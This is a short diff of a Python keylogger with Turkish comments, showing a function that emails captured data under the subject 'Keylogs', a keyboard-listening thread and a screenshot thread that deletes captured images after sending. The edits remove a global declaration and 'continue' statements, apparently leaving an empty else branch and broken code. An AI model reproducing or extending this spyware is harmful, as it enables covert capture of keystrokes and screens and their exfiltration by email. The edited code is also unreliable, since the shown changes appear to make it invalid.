@@ -17,9 +17,7 @@ data=""
 #veri aktarımı aralığını saniye olarak ifade eder isteğe bağlı olarak değiştirilebilir
 count=10
 
-def mail_at():
-    global data,count
-    
+def mail_at():    
     dosyam = EmailMessage()
     dosyam["Subject"] = "Keylogs"
     
@@ -78,9 +76,7 @@ def ss_bekle():
             temp=data
             data=""
             os.remove("Data\\ScreenShot.png")
-            continue
         else:
-            continue
 
 thread1 = threading.Thread(target = klavye_dinle)
 thread2 = threading.Thread(target = ss_bekle)
